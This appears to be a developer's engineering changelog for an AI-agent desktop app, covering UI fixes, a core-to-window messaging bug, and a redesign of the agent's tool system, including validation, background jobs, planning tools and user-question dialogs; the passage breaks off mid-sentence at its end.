**The core's `clear` method is still there, and nothing in the window calls it.**
That is a consequence rather than a tidy-up: clearing a conversation's messages
has no control anywhere now. Deleting one entirely does, and New chat starts a
different one -- but if clearing belongs somewhere else, that is a decision to
make rather than a button to quietly keep.

---

## One folder at a time (2026-10-10)

The folder system changed shape. There is one project folder at a time, a chat
belongs to the folder it is about, and **changing the folder takes the open chat
with it** -- so a chat and the folder it is about cannot drift apart.

**The sidebar is one flat list now.** It used to group conversations under a
foldable header per project, active one pinned first, and that structure existed
because several projects were in play at once. With one folder the grouping has
nothing to group: `groupByProject` is gone, and `rowsForFolder` -- the rule,
exported so it can be tested -- draws the current folder's chats and nothing
else. A chat filed under another folder is **not deleted**: it is somewhere else,
and changing back to that folder brings it back. That is the whole reason the
filter is a filter.

**With no folder open the list is everything.** There is nothing to scope by yet,
and the alternative -- showing only the chats that have no folder -- would greet
a first run with an empty list while the user's real chats sat behind a folder
they had not picked.

**The heading is the folder, and it is a button.** It names the list's scope and
it opens the picker: the picker used to hang off the project group's header,
which is gone, so without this the chats pane would have had no way to change
folders at all. It is drawn whether or not there are rows -- measured, because
the first version hung it off the rows, and a folder with no chats yet drew no
heading and no picker, which the window reported as `MISSING`.

**`conversations.move` is new, end to end**: `ConversationStore.move` (one field
and one write -- a conversation is one file whatever folder it is about, so
nothing is copied and the id does not change), a handler, and the frontend
calling it from `chooseFolder` *after* the folder is bound. The order matters and
is asserted: a move sent first would file the chat under the folder the pick
never reached. When the moved chat is the open one the handler binds the core's
own project to it, because `state` reporting the old folder over a chat filed
under the new one is exactly the disagreement `_bind_project` exists to prevent.

### The bug it found, which is much bigger than the feature

**No reply from the core had ever reached the window.** `CoreProcess._read_stdout`
strips the terminator off every line, so the host hands the page a list of
*lines* -- and `CoreBackend.ingest` frames on newlines. Passed straight through,
every reply was appended to the buffer and never split, so no request ever
resolved.

What that looked like: the window drew, said "connected", and stopped. The model
picker was empty, the status bar said "no provider", the first-run panel said
"No project folder", and the only requests it ever sent were the three whose
effects do not await a reply (`state`, `tools.get`, `reasoning.list`). It had been
that way since the pywebview migration, and every test passed -- because the fake
transport in `backend.test.ts` pushes *raw stdout with its terminators*, which is
the one thing the real host does not do.

Found by following this feature's own symptom: the new heading said `All chats`
while the core was reporting `project: ...\WebAIAgent`. The trail was the reply
arriving at the bridge (`[core] {"id": 1, "result": {...}}`), the push path
delivering it to the page, and the request list stopping dead after
`reasoning.list`. One line in `backend.ts` puts the terminator back, and
`backend.test.ts` now pushes exactly what the host pushes -- one bare line -- so
the seam cannot rot again.

After it: **eight** requests on boot instead of three, the model and the provider
in the bar, the restored transcript on screen, and the new heading reading
`WebAIAgent`.

---

## The tab, and what deleting a chat left behind (2026-10-10)

### The tab is a browser tab now

It was the reference's chip: a 30px stadium floating in the middle of the bar,
which is the shape of a *control*. It is the shape a browser gives the page it is
showing -- the height of the strip it is cut into, rounded at the top and **square
at the bottom** -- so it reads as attached to the top of the window rather than as
a pill that happens to be up there.

Square at the bottom is the whole of it. A radius on the lower corners lifts the
tab off the edge it is attached to, and then it is a chip again with a different
number in it. `--radius-xs` for the top two and not a bigger step: a browser's own
tabs are rounded by a few pixels, because the shape is doing the work and the
radius is only taking the corners off.

Measured in the running window, through the check `verify_window.py` now has:

    the tab's box: tab 72,0 233x51 in bar ..52: 1px from the bottom, radius 6px 6px 0px 0px

Full bar height, its bottom edge on the bar's own (the 1px is the bar's border),
and the computed radius showing two square corners -- which is the only way to see
that the lower pair is `0`.

### Deleting a chat left the window on no conversation at all

Reported from the app: delete the open chat, land on the empty state, and the bar
goes on naming the chat that no longer exists.

**The title was not the bug.** The title is read out of the list by the open
conversation's id, so a bar naming a deleted chat means the window still holds
that id -- and it did not. It held *nothing*: `deleteConversation` set
`conversation` to `""` and stopped, and a lookup by `""` finds nothing, so the tab
fell back to the application's own name.

The real damage was one step further on. With no conversation id, `_persist`
returns early (`if not self.conversations or not self.conversation_id`), so a
message typed into that empty state was **never saved anywhere** -- and the core's
own delete handler had been saying what should happen all along:

> Deleting the conversation you are looking at leaves you looking at nothing,
> which reads as a failure rather than as the intended result. So the window is
> moved on to a fresh one.

The moving-on was never implemented. `deleteConversation` now creates a fresh
conversation, which is where the core's comment says it belongs: a conversation
invented in the core would be one the window has never heard of -- there is no push
for "you are now in a different conversation" -- so the reply would have to carry
it and every caller would have to adopt it. `conversations.create` already exists,
files under the folder the window knows it is in, and answers the window directly.
The core's comment now says that instead of promising it.

Two tests in `App.test.tsx` pin both halves: deleting the open chat starts a chat
and the tab names it, and deleting a row you are **not** looking at moves nothing
and starts nothing.

---

## The blue rectangle on the composer (2026-10-10)

Reported as "a blue rectangle when clicked on the chatting panel". It was the
global focus ring, and it was landing on the one control in the app that could not
avoid it.

**`tokens.css` has one rule for every focusable thing**, and it is `:focus-visible`
on purpose -- "a ring on every click would teach people to ignore it". That works
everywhere except a text field, because **a text input matches `:focus-visible` even
on a mouse click**. That is the browser's heuristic, not the app's, and the composer
is the only text field.

So clicking a chat in the sidebar -- which focuses the composer, so the caret is
where the user is about to type -- drew the ring *inside* a card that already says
it is focused by taking its own border to `--accent`. Measured in the window: a
758x63 rectangle at `outline-offset: 2px` in `--accent-bright`, inside a card whose
border had gone `--accent`. Two blue boxes saying one thing.

` .composer textarea:focus-visible { outline: none }` is the whole fix, and
`layout.test.ts` has the guard that makes it safe. The old guard was
`assert.doesNotMatch(SOURCE, /outline:\s*none/)` -- *nothing* suppresses the ring --
which is a good rule with one legitimate exception, so it now asserts the exact set
of suppressions instead:

    [".composer textarea:focus-visible"]

and that the field really does have something else to say, because a field that
suppressed the ring and said nothing would be the original bug with the colours
swapped.

**The check for it has a `time.sleep` in the middle, and that is load bearing.**
Focusing the field and reading the card's border in the same `evaluate_js` reported
`rgba(255, 255, 255, 0.1)` -- the *unfocused* border -- on a card that was about to
have the right one, because `border-color` transitions. Two calls with half a second
between them report `rgb(99, 147, 240)`, which is `--accent`. The first version of
this check would have said the fix was broken.

---

## The tab strip (2026-10-10)

The title bar is a strip of tabs now, as a browser's is: one tab per chat you have
opened, an X on each, and a `+` after them. Right-clicking a tab offers Rename and
Close tab.

**A tab is an open conversation, not a copy of one.** The core holds a single
session, so selecting a tab is `conversations.switch` and re-reads the transcript.
Nothing is duplicated, and two tabs cannot disagree about what a chat says,
because there is only ever one of it. Clicking a chat that is already open
activates the tab it has rather than adding a second -- the one place the strip
refuses the obvious thing, because two tabs on one conversation would be two views
of one session and the only thing they could disagree about is which of them the
user meant.

**Closing a tab is not deleting a chat.** The conversation stays in the sidebar;
what goes away is one of the views of it. Deleting is the row menu's Delete, and
it is a different word on purpose. Closing the tab you are in hands over to the tab
that took its place, or the one before it, and starts a fresh chat if it was the
only tab -- "nowhere" being the state that lost messages two sections ago.

**Nothing in the strip is a drag region**, and that is the change that mattered
most. The class was on the tab and on its title when the tab was a label; a tab is
a control now, and the host drags only when the press lands on an element carrying
the class *itself* -- so leaving it on would have turned every click on a tab into
a window drag. The bar's background either side of the strip is what moves the
window, and `TopBar.test.tsx` asserts the exact set of classes rather than a count,
which is what caught it.

**Rename is refused on a chat with no messages**, from both menus, and the row
stays in the menu rather than disappearing: the menu is where a user finds out that
renaming exists, and an empty chat is exactly when they would go looking. The
reason is on its `title`. It is not a preference -- the core retitles a
conversation from its first user message *only while the name is still "New chat"*,
so a name typed into an empty chat is a name that chat can never outgrow.

**The `title` prop is gone from `TopBar`.** With a strip there is no single title
to fall back to: an empty strip is the mark, the `+` and nothing else, which is what
a browser shows with no tabs open. The `"TONYAgent"` fallback was the app's name
answering a question that is about the chat.

Measured in the running window, through the check `verify_window.py` now has:

    the tab strip: 1 tab(s), first 72,0 228x51 in bar ..52: 1px from the bottom, radius 6px 6px 0px 0px, 1 close(s), 1 new

### The flake, which was the test's fault

`ComposerPaste.test.tsx`'s paste helper broke out of its wait as soon as an
attachment **or** an error appeared. A paste that is over the limit produces
*both*: `acceptFiles` sets the error before it starts reading, and the attachments
land after `readFile` resolves. So the loop could stop on the error and the caller
would count zero files. Seen three times across this session as `0 !== 5` / "the
paste ignored the limit", and it read as the limit being bypassed.

It waits for the paste to *settle* now: two consecutive ticks with the attachment
count and the error unchanged. One tick is not enough, because the error is exactly
one tick ahead of the files.

### Where the strip starts

Measured, because "the right side of the sidebar" has three plausible answers 200px
apart: the rail ends at **64**, the sidebar panel at **288**, and the transcript's
text column starts at 83. The strip was at **72** -- `--rail-w` plus the bar's own
8px gap.

It starts at **288**, the panel's right edge, so the tabs sit over the transcript
beside the sidebar rather than over the sidebar's own column: at 72 the strip ran
across the panel and read as the panel's own header. The rule is
`calc(var(--list-w) - var(--rail-w) - 8px)` -- two tokens and the gap the bar
declares, with the gap taken back -- and not `--list-w` alone, which would measure
from the window's edge and land 64px past the panel, because the mark is already
there.

It does not move when the panel opens and shuts. `:has()` could follow it open and
closed, and a strip that slid sideways when a panel opened would move the tabs out
from under the pointer.

    the tab strip: 1 tab(s), first 288,0 228x51 in bar ..52: 1px from the bottom, radius 6px 6px 0px 0px, 1 close(s), 1 new

---

## The tool system: one declaration, real validation, and background jobs (2026-10-11)

**What this pass was.** The tool suite was ported towards the shape the DSH harness
uses -- its names, its semantics -- so that habits and prompt text transfer. Three
phases landed: structural prep, the cheap ports, and background jobs. **28 tools**,
up from 23.

### A tool is declared once now

`tools/schemas.py` was a second, hand-written copy of every tool's declaration: 570
lines of dictionaries restating the name, description, parameters and four flags the
`Tool` classes already carried. Nothing kept the two in step except a handful of
parity tests, and drift was *silent* in both directions -- the registry is what
**runs** a tool and `schemas.py` is what **advertises** it, so a tool missing there
was one the model was never told about.

`Tool.describe()` is the single declaration now, and `schemas.py` derives
`ALL_SCHEMAS` from the registry: **570 lines to 125.**

The derivation had to be **lazy** (module `__getattr__`, PEP 562) and the import
order in `tools/__init__.py` had to change. Reaching for `ALL_SCHEMAS` before the
tool modules are imported binds an *empty* list, and an empty tool list raises
nothing anywhere -- it is a model offered no tools at all, which presents as a model
that refuses to act. There is a test for exactly that.

Four parity tests became tautologies (comparing a thing to its own derivation), so
they were repointed at the failures still possible: a descriptor missing a field, a
`parameters` block that is not a complete JSON Schema, a category that is a plain
string. Each was mutation-checked by reintroducing the bug it guards.

**Three dormant bugs fell out of doing this:**

* **`Tool.get_schema()` wrapped an already-complete JSON Schema a second time.** It
  advertised `properties`, `required` and `additionalProperties` as the tool's
  *parameter names*. It never reached a model only because nothing called it. Fixed
  rather than deleted, since it is public.
* **`TAKE_SCREENSHOT_SCHEMA` was named in `__all__` without ever being imported**, so
  `from tonyagent.tools import *` raised `AttributeError`.
* A duplicated `skip_confirm = True` line in the confirmation block.

### A malformed call is refused in the model's own language

`validate_args` checked presence and nothing else, on the stated grounds that type
and range were the provider's business. The provider has no way to know what a *tool*
wants: it forwards JSON, and a wrong type then failed *inside* the tool as a
`TypeError` -- a message about a Python line, not about the argument at fault.

It now checks type, enum and unknown keys, and honours the `additionalProperties`
every schema already advertised. **It validates and never coerces**, which is what
keeps the original objection answered: there is still one place that decides what a
value *means* (the provider) and one that decides whether it is acceptable (here).
`bool` is excluded from `integer` and `number` by name, because
`isinstance(True, int)` is `True` in Python and a count would otherwise accept
`true`.

### Independent tool calls run at the same time

`_run_tool_calls` ran a batch strictly in order. It is now three phases -- plan,
execute, refuse -- with the admitted calls gathered concurrently.

Two things are load-bearing, and both are easy to get wrong:

* **Results come back in declared order regardless of completion order.** The tool
  messages after an assistant `tool_calls` array line up one for one; a batch that
  appended as calls finished would pair every result with the wrong request.
* **Refusals are emitted last, and each call's budget number is frozen when it is
  admitted.** A refusal quotes the budget line the turn actually reached and the
  window reads the final `TOOL_COMPLETED` as the failure, so emitting them during
  planning would have both describing a turn that had not run yet.

A batch containing a confirmation prompt stays fully sequential -- two dialogs at
once is worse than a slower turn -- and `ToolOrchestrator.will_prompt` is the single
answer to "will this ask?", asked by both the session and the orchestrator so the two
cannot disagree. A failing call cancels its siblings and awaits them, so nothing is
left running behind a failed turn.

### The file tools are `read`, `write` and `edit`

Renamed from `read_file`/`write_file`/`edit_file`, across the mode allow-lists, the
schema aliases and the tests. `read` gained `offset`/`limit` and returns numbered
lines with the window reported against the file total. `edit` **refuses an ambiguous
match** instead of silently replacing the first one, and gained `replace_all`. An
empty `old_string` is refused by name: it matches everywhere, so `replace_all` on it
would rewrite the file while reporting success.

The frontend needed **no changes at all** for any of this, and that was verified
rather than assumed: `npm test` passes with its fixtures still naming `read_file`,
because tool rendering is generic over the payload. What a tool *does* have to
satisfy is five payload contracts -- `id`, `name`, `result.status`, a **string**
detail, and a `file_change` artifact for the Files tree.

### `read_image`, `web_fetch`, and a `summary` for the card

* `read_image` sends pixels through `ToolResult.images`, the field deliberately
  excluded from `to_dict` -- because `to_dict` is both the wire payload *and* the body
  of the tool message written into every saved conversation, so a picture there would
  cost as much disk as the rest of the chat. The downscale moved to `tools/images.py`
  so it and `take_screenshot` cannot describe one downscale two ways; `MAX_EDGE` stays
  patchable as a name on `screen_tools` by being passed in explicitly.
* `web_fetch` is GET-only and shares `http_request`'s SSRF guard through one helper. A
  test asserts the two produce *byte-identical* refusals for the same URL, which is
  the only way to pin "one home for one rule".
* `folder_required` became a declared flag on `Tool`. The orchestrator had
  special-cased `!= "http_request"` by name, which could only ever describe one tool.
* **`ToolResult.summary` is new, and it fixed a blank card.** The window draws a
  card's detail from one string, looking for `summary` first. `execute_command` and
  `http_request` both return a structured dict, which the window will not render -- so
  a successful command showed a card with *nothing* on it and no error anywhere to say
  so. `output_excerpt` and `summary` fixed both, and a test now asserts the invariant
  the bug broke: a successful result whose `output` is not a string must carry a
  summary.

### Background jobs

Long-running commands no longer block a turn. `execute_command` gained
`background=true`, which starts a job and returns its id; `job_list`, `job_output`
and `job_kill` read it and stop it.

**Threads and `Popen`, not `asyncio` subprocesses.** An `asyncio.subprocess.Process`
belongs to the event loop that created it: when that loop closes, its pipes go with
it and the job can no longer be read even though its process is still running. A job
is *defined* by outliving the thing that started it.

Three more decisions worth the ink:

* **The kill takes the process group, not the process.** `shell=True` makes the real
  program a *child* of a shell, so terminating the process we hold leaves a dev server
  alive with its port still bound -- a "stopped" job that is not. Verified against a
  job that spawned a grandchild: the grandchild is gone, and the kill returned in
  0.17s rather than waiting out its 120s sleep.
* **Buffers are bounded, and they admit what they drop.** 256 KiB per stream, with
  dropped text counted and reported, so a gap in the output is never presented as
  continuous output. Finished jobs are pruned, on read as well as at start -- pruning
  only at start let the history settle one above the cap, which a test caught.
* **`atexit` stops everything.** The core is a child process; without it an exit
  leaves every job running with nothing left that knows about them.

**Jobs run on the host, and the sandbox refuses them.** That is deliberate, and it is
a limitation. The container is driven by a one-shot `exec_command` RPC that runs a
command and answers with its output, keeping no handle; making it host a job needs
new RPC methods *inside the image*, so it would ship as a feature that does not work
until the container is rebuilt. Detaching inside the container and polling a log file
over the existing RPC was considered and rejected -- a second job mechanism with its
own PIDs and liveness checks is the duplication this codebase argues against
elsewhere. The refusal names the way to make it work, and a test asserts a refused
background command starts *no* process.

### What this found and did not fix

**Six tools declare `requires_confirmation = True` with `destructive = False`** --
`http_request`, `web_fetch`, `browser_navigate`, `browser_click`, `browser_type`,
`execute_js`. The prompt gate is `destructive and requires_confirmation`, so **none of
them can ever prompt**. That may be intended (confirmation reserved for destructive
things) or the flags may be inert by accident. Changing it would start six tools
prompting, so it was left alone and recorded here. This said *five* when written and
counted the registry rather than the list, which is how `execute_js` was missed;
`web_fetch` joined when it was given `http_request`'s flags.

`tests/unit/test_tool_orchestrator_path.py` also carried dead `("edit_file",
"old_string")` overrides -- keys that never matched the old `old_text`/`new_text`
parameters and silently fell back to `"x"`. They are correct now.

### Verification

Python unit **852 passed / 9 skipped**, TypeScript **578 passed** (98 suites), and
`scripts/e2e_all_tools.py --fast` **35 checks, 0 failed** -- which covers all 28
tools, including a real background kill of a still-running job.

`scripts/e2e_all_tools.py` was itself broken by the rename and is fixed here: it
imported `ReadFileTool`, which no longer exists, and named the old tools in a dozen
places. Nothing in the test suite covers `scripts/`, so nothing failed -- which is the
finding, not the fix.

Committed afterwards, in `d4e66b9` — it was not committed when this was written.

---

## The plan and the goal: what the agent is working on (2026-10-11)

**What this pass was.** Phase 3 of the tool port. The agent keeps a task list and a
goal, and both persist with the conversation. **32 tools.**

### They are not the transcript

A transcript records what *happened*; a plan is what the agent *intends*. Kept in the
message history, a plan becomes something the model has to hunt for among everything
it tried and abandoned -- and it would be re-sent as though it were something either
party had said.

So `core/task_state.py` holds a `SessionState` (a list of `Todo`s and one goal) and
the session renders it into the **system prompt** on every request. Nothing is added
to `self.messages`, which keeps `clear()` and the history tests honest.

### One object, or the feature silently does nothing

The session renders `self.state`; the tools write through
`task_state.current_state()`. If those were two objects, a `todo_write` would report
success, the card in the transcript would show the new list, and the model would be
sent the **old** one on the next turn -- working, visibly, and doing nothing.
`AgentSession` therefore publishes its own state to the module (`set_state`), and
there is a test that writes through a tool and asserts the session's prompt changed.

The module global is the same shape as `folder_manager`: one open conversation at a
time, and tools are stateless singletons with no per-call context to thread a session
through. It is also why the tests reset it per test -- the per-conversation design
would otherwise leak through the back door.

### Saved with the conversation

`Conversation` gained a `state` key, read defensively (`dict(raw) if isinstance(raw,
dict) else {}`), so a file written before it existed opens as "no plan" and **no
migration is needed**. That is the same rule the store already applies to message
fields, and it is why the field is a plain dict rather than a `SessionState`: this
module *is* the file format and must not import the thing it stores.

`_persist` banks it and `_load_into_session` adopts it, both in the server, because
the session knows nothing about storage. The test that matters switches away and back
and asserts the plan came home; the trap is ordering -- `_new_session` publishes an
empty state, so restoring the plan *first* is overwritten immediately.

`plan.get` was added so a window can read the plan without scraping it out of a tool
result. It is deliberately not folded into `state`, which is about mode, permission
and sandbox: adding a key there would oblige every existing reader to know about a
field it does not use.

### The tools

* **`todo_write` sends the whole list, every time.** Not a patch -- that is the only
  shape in which *removing* a step is possible without a second verb, and a list that
  can only grow is one nobody prunes. A step the model quietly abandoned is then read
  on every later turn as work still outstanding.
* **A bad item changes nothing.** Every item is validated before anything is stored,
  so a list with a typo in its fifth entry does not leave the first four behind. The
  refusal names the item's number.
* **`create_goal` refuses to overwrite a live goal**, naming `update_goal` as the way
  through. Silently replacing an objective drops work the user asked for with nothing
  recording that it was abandoned.
* **A blocked goal must say what it is blocked on.** "Blocked" with no reason is the
  report that helps nobody: the next turn reads it, learns nothing, and either retries
  the same wall or stops for no stated cause. The note is required of the *resulting*
  state rather than of the call, so rewording an already-blocked goal does not demand
  a restatement of the reason -- that wart was found by a test, not by reading.

None of the four is destructive or confirmation-gated: they write the agent's own
note-to-self, not the user's project, and they are offered in **every mode including
Plan**, which is where a plan belongs most.

### `exit_plan_mode` is not in this phase, and here is why

This phase's objective asked for a decision rather than an implementation. The answer
is no, for three concrete reasons:

1. **It needs an approval affordance that does not exist.** The only dialog available
   is the tool confirmation, gated on `destructive and requires_confirmation` and
   worded "Confirm tool execution". Approving a *plan* is a question, not a
   destructive act, and borrowing that dialog labels it wrongly.
2. **Approving it would delete the thing being approved.** `AgentSession.set_mode`
   clears the conversation on purpose -- "a mode change re-shapes what the agent is
   for". An in-turn switch to Build would wipe the transcript and the plan the user had
   just read and agreed to.
3. **A tool cannot reach the mode.** Tools are stateless singletons; the session
   publishes only flags to them (`_ALLOWLIST_BYPASS`, `_HOST_EXECUTION`). Publishing a
   mode setter is a new kind of dependency, and it should arrive when something
   actually needs it.

What exists instead: the plan is in the system prompt and readable through
`plan.get`, and the user acts on it by changing mode themselves -- which, like every
mode change today, starts a fresh conversation, because that is what `set_mode` does.

### Verification

---

Python unit **919 passed / 10 skipped**, TypeScript **578 passed** (98 suites), and
`scripts/e2e_all_tools.py --fast` **42 checks, 0 failed** -- now covering all 32 tools,
including the four planning tools and their refusals.

Committed afterwards, in `d4e66b9` — it was not committed when this was written.

---

## `ask_user_question` and `present`: the agent asks *you* (2026-10-11)

**What this pass was.** Phase 4 of the tool port. **34 tools.** The agent can put
something in front of the user mid-turn and wait: `ask_user_question` asks one
question and returns what they said, `present` shows something and returns whether
they had anything to add. Everything before this pass touched the project, the
machine or the network; these two touch the person, and they are the only ones
that do.

**The plumbing is a copy of the confirmation path, on purpose.**
`tonyagent/core/user_io.py` is a future, a pending table and two callbacks -- the
same triple `ConfirmationRequest` uses, for the same three reasons: the future is
what the tool suspends on, the table is what lets a late reply find the question
it belongs to, and the callback is what publishes the ask as an event so a window
can draw it. A second dialog mechanism beside the confirmation would have meant
two pending-answer tables, two timeouts and two ways to strand a turn. What
differs is only the answer: a confirmation resolves to a bool, this resolves to
whatever the user typed.

It is a module global because **tools are stateless singletons** -- the same
constraint `folder_manager` and `task_state` live with, and the reason there is no
per-call session to thread through. The session installs both hooks in
`install_question_bridge()`, called from `_attach_session` alongside the
confirmation bridge, exactly as `test_headless_core.py` asserts.

**One event pair, one dialog, one method, two tools.** `user.asked` /
`user.resolved` and `user.respond {id, answer}` serve both, with `kind` in the
payload saying which. The dialog (`QuestionDialog.tsx`) renders either: a question
gets the core's options as buttons plus a box, a presentation gets the content and
an Acknowledge. The difference the *core* cares about is what a non-answer means,
and that is decided on the core's side rather than split across the wire.

**The two tools fail differently, and that is the design.**

| | answered | no answer (Escape) | no answer in 60s | nothing listening |
|---|---|---|---|---|
| `ask_user_question` | SUCCESS, the text | SUCCESS, "chose not to answer" | ERROR | ERROR |
| `present` | SUCCESS, the note | SUCCESS, "read, nothing to add" | SUCCESS, "have not responded" | ERROR |

A question that got nothing did not get what it needed, so the call failed and the
model is told to state an assumption and carry on. A presentation that got nothing
was still *delivered* -- the content is on their screen -- so reporting failure
would teach the model that showing its work is an error. Nothing-listening is a
failure for both, and it refuses immediately rather than paying the timeout: a
bare session has no user, and a minute per question for a condition knowable
before the ask was made is a minute wasted.

**`asks_user` is a new flag, kept out of `describe()`.** The descriptor is the
advertised contract -- what the model is shown and what `tools.get` reports -- and
"this tool will interrupt you" is not part of the model's contract. It is the
orchestrator's scheduling information, and it is read in exactly one place:
`will_prompt` answers True for it **before** the trust and Full skip conditions,
because two dialogs at once is worse than a slower turn, and `skips_confirmation`
is a statement about approvals of *destructive* work -- a user who said "stop
asking me" about file writes has not said "never ask me anything". A test pins
that against Full plus a trusted project.

Neither tool needs a project folder (`folder_required = False`), the same
exception the network tools made: a question about what the user wants does not
read a file, and the orchestrator's folder gate would otherwise refuse the one
call that works perfectly well on a bare session.

**Both are in every mode's allow-list, Plan most of all.** A plan is what Plan
mode exists to hand over for approval, and a mode that could not show its plan to
the user would have no way to end. Mission keeps them too, and that is deliberate:
its prompt says "do not stop to ask whether to continue", which is a preference for
the model rather than a wall built out of a missing tool name -- and a question
about a missing credential is the one interruption a long unattended run must not
be prevented from making. The 60s timeout bounds the wait either way.

**Two bugs, both found by tests, and one of them only in a full run.**

The first: the cancelled-turn path left the dialog on screen. `ask()` settled its
round trip only `if not request.future.done()` -- and cancelling the awaiting
task cancels the future it is waiting on, so a cancelled ask looks *done*. The
result was exactly the failure this module exists to prevent: a modal over a turn
that had stopped, with nothing to close it. The guard is gone, and
`test_a_cancelled_turn_settles_the_ask_and_leaves_nothing_behind` now covers all
three of settled, announced, and out of the table.

The second is the one worth remembering, because it passed every test run alone.
`will_prompt` answers True for a question -- it has to, or a batch containing one
would run concurrently and put a dialog beside a streaming tool -- and
`_execute_tool_async` used to read that same method to decide whether to raise the
*confirmation*. A question therefore arrived as "Confirm tool execution / Allow /
Deny", and only after Allow as the question itself: two modals for one blocked
turn, the first about nothing. Every unit test passed, because a test with no
confirmation callback installed takes the "nothing to ask" branch and the question
goes straight through; it took `test_modes_and_diffs` running *first* -- which
leaves a callback behind -- for the failure to surface in a full-suite run. The
executor now asks `_needs_confirmation` (narrow, destructive-only, the new home of
the conditions that used to live inline) and `will_prompt` delegates to it plus
`asks_user`, so the two can no longer come to mean the same thing.
`test_a_question_is_not_routed_through_the_destructive_confirmation` covers it,
fails in 0.4s, and was checked against a deliberate reintroduction of the bug.

The frontend half closes the same hole from the other side: `turn.finished` now
clears `pendingAsk` in the reducer, because a stopped turn may settle its ask
after the window has already ended the turn. `pendingConfirm` still has the older
wart and was left alone.

**Refusals are in the model's own words, before anything is shown.** An empty
question, a question over 1000 characters, more than six options, an empty option,
a duplicate option (two buttons saying the same thing make the answer ambiguous),
an option over 200 characters, a presentation over 20000 characters. Each names
the limit and what to send instead. `validate_args` does not recurse into array
`items` -- still -- so the tool validates its own options, which is the same
situation `TodoWriteTool` is in.

**What this found about the window.** `App.tsx`'s `respond` pattern needed a twin
(`respondAsk`), and the `useLastValue`+`Overlay` pairing that exists for the
confirmation exists for questions too: a second ask can arrive while the first is
still fading out, and the "answer exactly once" guard is keyed on the id for the
same reason it is in `ConfirmDialog`.

**Verification.**

Python unit **966 passed / 10 skipped**, TypeScript **593 passed** (98 suites), and
`scripts/e2e_all_tools.py --fast` **47 checks, 0 failed** -- now covering all 34
tools, including both new ones answered, both refused with nobody listening, and
the duplicate-option refusal. `scripts/audit_reduced_motion.py` passes with the new
`question-modal.css` (22 modules now). `npm run build` clean.

The turn-level guarantee has its own test:
`test_a_question_inside_a_real_turn_is_answered_and_carries_on` runs a real turn
through `run_turn` against a stub provider that asks once and answers once, with
**both** bridges installed -- the wiring a real window has -- rather than calling
the tool directly. That choice is what it pins: the question goes to the user
*once*, with no approval dialog in front of it, the answer is stored as JSON in
the transcript, and the turn reaches a real answer instead of stopping at the
tool. A stalled turn is harder to ask for than a tool, so the ask is awaited on
the event bus while the turn runs as its own task.

Two things about how those numbers were produced. **One pytest process could not
finish this suite on this machine, and that turned out to be a diagnosable bug rather
than a property of the machine.** It died without a traceback after roughly two
minutes at about 64%, and every file passed on its own — which is the signature of an
outer timeout killing a run that had *stalled*, not of a crash.

The stall: `AgentSession` publishes its question and presentation callbacks into the
process-global `core.user_io`, and only `test_user_questions.py` reset them. So after
the first test that built a session, every later ask found a listener, waited out the
whole 60s `ASK_TIMEOUT_S`, and the two tools that ask the user cost a minute each.
Measured:

    test_tool_orchestrator_path.py alone .....................   1.9s
    the same file after one that builds a session ........... 122.2s

Three tests stalled for 60s each — 240s of a 281s run — which is what pushed the run
past a two-minute cap. `tests/conftest.py` now resets `user_io` around every test, the
same guard `_isolate_config_path` applies for the same reason: a test that drives the
real handler is an accidental *writer* there and an accidental *listener* here. The
suite is **966 passed / 10 skipped in 41s in a single process**, order-independent,
and **the two halves are no longer needed.**

Worth keeping from this, because it is easy to get wrong in the other direction: the
bridge is installed *explicitly*, by `AgentSession.install_question_bridge()`, which
only `headless/server.py` (`_attach_session`) calls. A bare session, a scripted import
or any core not driven through `StdioServer` therefore has no listener and
`ask_user_question` refuses at once — the contract `UserUnavailable` documents is met.
The stall was purely a *test* leak: the first test to build a `StdioServer` installed
the listener process-globally and nothing took it back down. A review of this pass
briefly recorded it as a product bug; it is not one.

**And the file's event-loop waits are bounded in seconds, not in yields.** `_until` counted 200 `asyncio.sleep(0)` round trips, which ran out on
a busy machine and failed as *the ask never happened* -- the one failure mode
`test_user_questions.py` exists to detect honestly, reported about the wrong
thing. It now bounds on wall clock; the same one-loop pattern in
`test_headless_core.py` was fixed the same way.

**Not done here.**

- **Six** tools can never prompt (`http_request`, `web_fetch`, `browser_navigate`,
  `browser_click`, `browser_type` and `execute_js`): the prompt gate is
  `destructive and requires_confirmation` and all six set only the second. This list
  said *five* until it was counted against the registry, and the one it left out was
  `execute_js` — so a fix driven by that list would have left an inert tool behind.
  Unchanged here, and `ask_user_question` is *not* the fix for them.
- `exit_plan_mode` is still not built, and this pass makes the reason sharper:
  `present` can show a plan and collect a reply, but it cannot change the mode,
  and `set_mode` clears the conversation -- so approving a plan through it would
  still delete the plan being approved. The approval affordance has to be able to
  act on the mode, which no tool can reach yet.
- Nothing rate-limits a question beyond the turn's tool budget. A model that asks
  every turn is possible; the descriptions push hard against it and the budget
  bounds it, but nothing refuses it.
- A headless core that is not the StdioServer gets no question bridge installed,
  so `ask_user_question` refuses at once there. The window's core has it;
  a client driving the core directly must install it.

**This pass is committed, as `d4e66b9`** — together with everything that had been
sitting uncommitted, which is why that commit is 222 files. The only uncommitted work
is the three-file fix-up from the review that follows.

---

## The `user_io` leak, and what it cost (2026-10-11)

**A review of Phase 4, and one fix.** Phase 4 itself is sound — see the section above —
and this records what the review found, including two things it got wrong.

### The suite was seven times slower, and the commit's own note misread why

The Phase 4 commit records that a single pytest process "dies without a traceback after
roughly two minutes, at about 64%", worked around by running the suite in two halves.
That is a **symptom, not a machine property**, and it is fixed.

`AgentSession.install_question_bridge()` publishes the question and presentation
callbacks into the process-global `core.user_io`, and `headless/server.py` calls it from
`_attach_session`. That is deliberate — one window, one session, one place for a question
to arrive — but only `test_user_questions.py` reset it. So the first test in a run that
built a `StdioServer` left a listener installed, and every later test that asked a
question waited out the whole 60s `ASK_TIMEOUT_S`. Measured:

    test_tool_orchestrator_path.py alone .....................   1.9s
    the same file after one that builds a StdioServer ........ 122.2s

Three tests stalled 60s each — 240s of a 281s run — which is what pushed the run past a
two-minute cap: killed with no traceback at roughly 64%, with every file passing on its
own. **The halves were a workaround for a timeout, not for a crash**, and they are no
longer needed.

`tests/conftest.py` now resets `user_io` around every test, the same guard
`_isolate_config_path` applies and for the same reason: a test that drives the real
handler is an accidental *writer* there and an accidental *listener* here. The suite is
**966 passed / 10 skipped in 41s, in one process, order-independent**.
`test_no_successful_dict_output_is_left_without_a_summary` — a Phase 1 test that drives
every tool through the orchestrator — was one of the three stalled tests, and the guard
fixed it without touching it.

### Two things the review got wrong, and what caught them

Both are recorded so the next reader does not repeat them.

* **`asks_user` in `describe()`.** It looked like an oversight that the new flag was the
  only one missing from the descriptor, so it was added — which failed
